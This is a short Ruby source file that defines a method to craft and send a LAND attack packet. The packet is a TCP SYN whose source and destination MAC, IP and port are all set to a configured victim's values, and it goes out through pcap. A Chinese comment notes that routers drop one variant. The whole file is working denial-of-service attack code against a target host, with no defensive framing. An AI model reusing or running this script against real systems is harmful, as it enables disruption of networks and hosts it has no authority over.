require_relative '../../protocol/tcp_pac.rb'

class TCPP
	def self.land(pcap)
		land_pac = TCPP.syn_pac{|pac|
			pac.etherh.src_mac = CONFIG[:victim_mac] #若为CONFIG[victim_mac]，路由器不给过
			pac.etherh.dst_mac = CONFIG[:victim_mac]
			pac.ipv4h.set_addr_by_arr(CONFIG[:victim_ip], :src)
			pac.ipv4h.set_addr_by_arr(CONFIG[:victim_ip], :dst)
			pac.tcph.src_port = CONFIG[:victim_port]
			pac.tcph.dst_port = CONFIG[:victim_port]
		}
		pcap.send_packet(land_pac)
	end
end